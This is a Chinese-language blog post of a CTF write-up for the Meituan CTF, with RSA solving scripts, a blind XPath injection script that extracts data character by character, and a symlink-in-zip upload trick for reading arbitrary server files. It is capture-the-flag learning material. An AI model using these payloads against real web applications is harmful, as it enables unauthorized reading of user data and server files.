<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 5.4.2">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.2/css/all.min.css" integrity="sha256-xejo6yLi6vGtAjcMIsY8BHdKsLg7QynVlFMzdQgUuy8=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"twe1v3.github.io","root":"/","images":"/images","scheme":"Gemini","darkmode":false,"version":"8.12.3","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>

    <meta name="description" content="美团CTF，好玩的，难度也不错，师傅们太强啦！">
<meta property="og:type" content="article">
<meta property="og:title" content="MT-CTF-Writeup">
<meta property="og:url" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/index.html">
<meta property="og:site_name" content="TWe1v3">
<meta property="og:description" content="美团CTF，好玩的，难度也不错，师傅们太强啦！">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/xB5nlju1bu47FibXGyotBw.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/ezFtSI_DXc66SQ4rsGdDiw.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/Yhut2UBDdjhU1HRdsrIkJQ.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/MqA7vFiNYqVxVBxCUaSVOg.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/vK2D2uEAIPF8eUlvvjO1Ww.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/NIj_m3ePomvNmqnedYKJqw.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/9GVF4sWsMZTpZTzVsU4WCA.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/K5J0v8JuNuVU0KNm3B0IGA.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/LINGgj13umO_LKwO4910kQ.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/xjNAP_qZrZsv3u0Wrp_gOg-166427030055210.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/hQaXdjeI8kdpDiOkGqIXSg.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/9JL4IvvtABLoNAquRwetrA.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/e7Ydd8t3cchsUByy2klzDQ.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/XYLE2NUnBulMjsDqQRqnVA.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/image-20221008000647522-166727395787415.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/image-20221008002817077-166727395787416.png">
<meta property="og:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/image-20221008212336541-166727395787417.png">
<meta property="article:published_time" content="2022-09-26T10:44:33.000Z">
<meta property="article:modified_time" content="2023-02-07T11:21:19.861Z">
<meta property="article:author" content="TWe1v3">
<meta property="article:tag" content="Web">
<meta property="article:tag" content="Crypto">
<meta property="article:tag" content="Pwn">
<meta property="article:tag" content="Misc">
<meta property="article:tag" content="Re">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/xB5nlju1bu47FibXGyotBw.png">


<link rel="canonical" href="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/">



<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":"","permalink":"http://twe1v3.github.io/2022/09/MT-CTF-Writeup/","path":"2022/09/MT-CTF-Writeup/","title":"MT-CTF-Writeup"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>MT-CTF-Writeup | TWe1v3</title>
  





<script src="/lib/fireworks.js"></script>
  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">TWe1v3</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>文章标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>文章分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>时间轴</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于TWe1v3</a></li><li class="menu-item menu-item-friendlink"><a href="/friendlink/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#mininep1%E6%88%98%E9%98%9F-mt-ctf-writeup"><span class="nav-number">1.</span> <span class="nav-text"> MiniNep1战队-MT-CTF-Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">1.1.</span> <span class="nav-text"> 战队信息：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%98%E9%98%9F%E6%88%90%E5%91%98twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"><span class="nav-number">1.1.1.</span> <span class="nav-text"> 战队成员：TWe1v3、zealot、1amfree、scr1pt_k1ddi3、ZERO</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%98%E9%98%9F%E5%90%8D%E7%A7%B0mininep1"><span class="nav-number">1.1.2.</span> <span class="nav-text"> 战队名称：MiniNep1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%88%98%E9%98%9F%E6%8E%92%E5%90%8D"><span class="nav-number">1.1.3.</span> <span class="nav-text"> 战队排名：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%83%85%E5%86%B5"><span class="nav-number">1.2.</span> <span class="nav-text"> 解题情况：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">1.3.</span> <span class="nav-text"> 解题过程</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crypto"><span class="nav-number">1.3.1.</span> <span class="nav-text"> Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#strange_rsa1"><span class="nav-number">1.3.1.1.</span> <span class="nav-text"> strange_rsa1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#strange_rsa2"><span class="nav-number">1.3.1.2.</span> <span class="nav-text"> strange_rsa2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web"><span class="nav-number">1.3.2.</span> <span class="nav-text"> Web</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#babyjava"><span class="nav-number">1.3.2.1.</span> <span class="nav-text"> babyjava</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#onlineuzip"><span class="nav-number">1.3.2.2.</span> <span class="nav-text"> OnlineUzip</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwn"><span class="nav-number">1.3.3.</span> <span class="nav-text"> PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#note"><span class="nav-number">1.3.3.1.</span> <span class="nav-text"> note</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ret2libc_aarch64"><span class="nav-number">1.3.3.2.</span> <span class="nav-text"> ret2libc_aarch64</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8D%89%E8%BF%B7%E8%97%8F"><span class="nav-number">1.3.3.3.</span> <span class="nav-text"> 捉迷藏</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#mininep1%E7%BE%8E%E5%9B%A2%E5%86%B3%E8%B5%9Bctfwriteup"><span class="nav-number">2.</span> <span class="nav-text"> Mininep1–美团决赛CTF–Writeup</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80-%E6%88%98%E9%98%9F%E4%BF%A1%E6%81%AF"><span class="nav-number">2.1.</span> <span class="nav-text"> 一、战队信息</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C-%E8%A7%A3%E9%A2%98%E8%AF%A6%E6%83%85"><span class="nav-number">2.2.</span> <span class="nav-text"> 二、解题详情</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89-%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B"><span class="nav-number">2.3.</span> <span class="nav-text"> 三、解题过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#misc"><span class="nav-number">2.4.</span> <span class="nav-text"> Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#what_is_that"><span class="nav-number">2.4.1.</span> <span class="nav-text"> What_is_that</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwn-2"><span class="nav-number">2.5.</span> <span class="nav-text"> Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#heap"><span class="nav-number">2.5.1.</span> <span class="nav-text"> heap</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crypto-2"><span class="nav-number">2.6.</span> <span class="nav-text"> Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#strange_lwe"><span class="nav-number">2.6.1.</span> <span class="nav-text"> strange_lwe</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#reverse"><span class="nav-number">2.7.</span> <span class="nav-text"> Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#crackme"><span class="nav-number">2.7.1.</span> <span class="nav-text"> crackme</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#web_%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.8.</span> <span class="nav-text"> Web_复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#mako_imagemagick"><span class="nav-number">2.8.1.</span> <span class="nav-text"> Mako_imagemagick:</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%8E%B0"><span class="nav-number">2.8.1.1.</span> <span class="nav-text"> 赛题复现：</span></a></li></ol></li></ol></li></ol></li></ol></div>
        </div>
        <!--/noindex-->

        <div class="site-overview-wrap sidebar-panel">
          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="TWe1v3"
      src="/images/twe1v3.jpg">
  <p class="site-author-name" itemprop="name">TWe1v3</p>
  <div class="site-description" itemprop="description">TWe1v3的博客</div>
</div>
<div class="site-state-wrap site-overview-item animated">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
        <a href="/archives/">
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
          <a href="/categories/">
        <span class="site-state-item-count">13</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
          <a href="/tags/">
        <span class="site-state-item-count">31</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author site-overview-item animated">
      <span class="links-of-author-item">
        <a href="https://github.com/TWe1v3" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;TWe1v3" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:twe1v3@qq.com" title="E-Mail → mailto:twe1v3@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



        </div>
      </div>

    </div>
  </aside>
  <div class="sidebar-dimmer"></div>


    </header>

    
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>
  <div class="reading-progress-bar"></div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


    <div class="main-inner post posts-expand">


  


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://twe1v3.github.io/2022/09/MT-CTF-Writeup/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/twe1v3.jpg">
      <meta itemprop="name" content="TWe1v3">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="TWe1v3">
      <meta itemprop="description" content="TWe1v3的博客">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="MT-CTF-Writeup | TWe1v3">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          MT-CTF-Writeup
        </h1>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2022-09-26 18:44:33" itemprop="dateCreated datePublished" datetime="2022-09-26T18:44:33+08:00">2022-09-26</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2023-02-07 19:21:19" itemprop="dateModified" datetime="2023-02-07T19:21:19+08:00">2023-02-07</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">分类于</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E8%B5%9B%E4%BA%8BWriteup/" itemprop="url" rel="index"><span itemprop="name">赛事Writeup</span></a>
        </span>
    </span>

  
    <span class="post-meta-break"></span>
    <span class="post-meta-item" title="本文字数">
      <span class="post-meta-item-icon">
        <i class="far fa-file-word"></i>
      </span>
      <span class="post-meta-item-text">本文字数：</span>
      <span>21k</span>
    </span>
    <span class="post-meta-item" title="阅读时长">
      <span class="post-meta-item-icon">
        <i class="far fa-clock"></i>
      </span>
      <span class="post-meta-item-text">阅读时长 &asymp;</span>
      <span>19 分钟</span>
    </span>
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
        <p>美团CTF，好玩的，难度也不错，师傅们太强啦！</p>
<span id="more"></span>
<h1 id="mininep1战队-mt-ctf-writeup"><a class="markdownIt-Anchor" href="#mininep1战队-mt-ctf-writeup"></a> <strong>MiniNep1战队-MT-CTF-Writeup</strong></h1>
<h2 id="战队信息"><a class="markdownIt-Anchor" href="#战队信息"></a> <strong>战队信息：</strong></h2>
<h3 id="战队成员twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"><a class="markdownIt-Anchor" href="#战队成员twe1v3-zealot-1amfree-scr1pt_k1ddi3-zero"></a> 战队成员：TWe1v3、zealot、1amfree、scr1pt_k1ddi3、ZERO</h3>
<h3 id="战队名称mininep1"><a class="markdownIt-Anchor" href="#战队名称mininep1"></a> <strong>战队名称：MiniNep1</strong></h3>
<h3 id="战队排名"><a class="markdownIt-Anchor" href="#战队排名"></a> <strong>战队排名：</strong></h3>
<p><img src="/2022/09/MT-CTF-Writeup/xB5nlju1bu47FibXGyotBw.png" alt="x"></p>
<h2 id="解题情况"><a class="markdownIt-Anchor" href="#解题情况"></a> <strong>解题情况：</strong></h2>
<p><img src="/2022/09/MT-CTF-Writeup/ezFtSI_DXc66SQ4rsGdDiw.png" alt="2"></p>
<h2 id="解题过程"><a class="markdownIt-Anchor" href="#解题过程"></a> 解题过程</h2>
<h3 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> <strong>Crypto</strong></h3>
<h4 id="strange_rsa1"><a class="markdownIt-Anchor" href="#strange_rsa1"></a> <strong>strange_rsa1</strong></h4>
<p>在给定的实数域上求根，然后转整数得到q，解RSA即可。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">n = 108525167048069618588175976867846563247592681279699764935868571805537995466244621039138584734968186962015154069834228913223982840558626369903697856981515674800664445719963249384904839446749699482532818680540192673814671582032905573381188420997231842144989027400106624744146739238687818312012920530048166672413</span><br><span class="line">c = 23970397560482326418544500895982564794681055333385186829686707802322923345863102521635786012870368948010933275558746273559080917607938457905967618777124428711098087525967347923209347190956512520350806766416108324895660243364661936801627882577951784569589707943966009295758316967368650512558923594173887431924</span><br><span class="line">gift = 0.9878713210057139023298389025767652308503013961919282440169053652488565206963320721234736480911437918373201299590078678742136736290349578719187645145615363088975706222696090029443619975380433122746296316430693294386663490221891787292112964989501856435389725149610724585156154688515007983846599924478524442938</span><br><span class="line"></span><br><span class="line"><span class="attribute">F</span>=RealField(prec=512*2)</span><br><span class="line">R.&lt;x&gt;=PolynomialRing(F)</span><br><span class="line"><span class="attribute">f</span>=x*x*gift-n</span><br><span class="line"><span class="attribute">r</span>=f.roots()[0][0]</span><br><span class="line"><span class="attribute">q</span>=int(abs(r))</span><br><span class="line"><span class="comment">#q=10481297369477678688647473426264404751672609241332968992310058598922120259940804922095197051670288498112926299671514217457279033970326518832408003060034369</span></span><br><span class="line"><span class="attribute">p</span>=n//q</span><br><span class="line"><span class="attribute">d</span>=inverse(e,(p-1)*(q-1))</span><br><span class="line"><span class="attribute">m</span>=pow(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h4 id="strange_rsa2"><a class="markdownIt-Anchor" href="#strange_rsa2"></a> <strong>strange_rsa2</strong></h4>
<p>注意这题用到了上题的flag。</p>
<p>给出了两个随机多项式，我的想法是构造二元多项式，用grobner基求出a。由于模数p未知，先用n替代。然而解完惊奇地发现顺带把p直接规约出来了，属于是意外收获了。后面解RSA就OK了。</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number import *</span><br><span class="line"></span><br><span class="line">def my_poly(coe,x):</span><br><span class="line">	<span class="attribute">res</span>=0</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> range(1,513):</span><br><span class="line">		res+=coe[i-1]*(x^i)</span><br><span class="line">	return res</span><br><span class="line"></span><br><span class="line">e = 0x10001</span><br><span class="line">flag1 = b<span class="string">&#x27;flag&#123;a5537b232c1ab750e0db61ec352504a301b7b212&#125;&#x27;</span></span><br><span class="line">k = bytes_to_long(flag1)</span><br><span class="line">exec(open(<span class="string">&#x27;output.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read())</span><br><span class="line">R.&lt;a,t&gt;=PolynomialRing(Zmod(n))</span><br><span class="line"><span class="attribute">s1</span>=gift[0][0]</span><br><span class="line"><span class="attribute">coe1</span>=gift[0][1:]</span><br><span class="line"><span class="attribute">s2</span>=gift[1][0]</span><br><span class="line"><span class="attribute">coe2</span>=gift[1][1:]</span><br><span class="line"><span class="attribute">f1</span>=my_poly(coe1,a)+s1</span><br><span class="line"><span class="attribute">f2</span>=my_poly(coe2,t)+s2</span><br><span class="line"></span><br><span class="line"><span class="attribute">res</span>=Ideal([f1,f2,t-k<span class="number">*a</span>]).groebner_basis()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">res=[ x.constant_coefficient() <span class="keyword">for</span> x <span class="keyword">in</span> res]</span><br><span class="line">a,t,<span class="attribute">p</span>=list(map(int,res))</span><br><span class="line"><span class="built_in">print</span>(a,t,p)</span><br><span class="line"><span class="attribute">q</span>=n//p</span><br><span class="line"><span class="attribute">d</span>=inverse(e,(p-1)*(q-1))</span><br><span class="line"><span class="attribute">m</span>=pow(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(int(m)))</span><br><span class="line"><span class="comment">#b&#x27;flag&#123;e6d7511d75bd537e1bd0cd08abea415f5f27d6cf&#125;&#x27;</span></span><br></pre></td></tr></table></figure>
<h3 id="web"><a class="markdownIt-Anchor" href="#web"></a> <strong>Web</strong></h3>
<h4 id="babyjava"><a class="markdownIt-Anchor" href="#babyjava"></a> <strong>babyjava</strong></h4>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&quot;http://eci-2ze39yqy7j0c006fv94i.cloudeci1.ichunqiu.com:8888/hello&quot;</span></span><br><span class="line">strs =<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-@!&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">payload1=<span class="string">&quot;&#x27;or substring(name(/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload2=<span class="string">&quot;&#x27;or substring(name(/root/*[1]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27; or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line">payload3=<span class="string">&quot;&#x27;or substring(name(/root/user/*[2]), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span> <span class="comment">#username username</span></span><br><span class="line"><span class="comment">#&#x27;or string-length(name(/root/user/username[2]))=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27;</span></span><br><span class="line">payload4=<span class="string">&quot;&#x27;or substring(/root/user/username[2]/text(), &#123;&#125;, 1)=&#x27;&#123;&#125;&#x27;  or &#x27;&#x27;=&#x27; &quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> strs:</span><br><span class="line">        data=&#123;<span class="string">&quot;xpath&quot;</span>:payload4.<span class="built_in">format</span>(i,j)&#125;</span><br><span class="line">        <span class="built_in">print</span>(data)</span><br><span class="line">        r=requests.post(url,data=data)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;This information is not available&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag+=j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="string">&quot;!&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            exit()</span><br><span class="line">        <span class="comment"># if &quot;This information is not available&quot; in r.text:</span></span><br><span class="line">        <span class="comment">#     print(flag)</span></span><br><span class="line">        <span class="comment">#     break</span></span><br></pre></td></tr></table></figure>
<p>xpath注入，flag在user的第二个username里</p>
<p><img src="/2022/09/MT-CTF-Writeup/Yhut2UBDdjhU1HRdsrIkJQ.png" alt="3"></p>
<h4 id="onlineuzip"><a class="markdownIt-Anchor" href="#onlineuzip"></a> <strong>OnlineUzip</strong></h4>
<p>文件上传存在软链接任意文件读取</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ln -s / <span class="keyword">test</span></span><br><span class="line"><span class="keyword">zip</span> -y <span class="keyword">test</span>.<span class="keyword">zip</span> <span class="keyword">test</span></span><br></pre></td></tr></table></figure>
<p><img src="/2022/09/MT-CTF-Writeup/MqA7vFiNYqVxVBxCUaSVOg.png" alt="4"></p>
<p>flag文件没有权限，但是报错了，尝试去还原pin</p>
<p><img src="/2022/09/MT-CTF-Writeup/vK2D2uEAIPF8eUlvvjO1Ww.png" alt="5"></p>
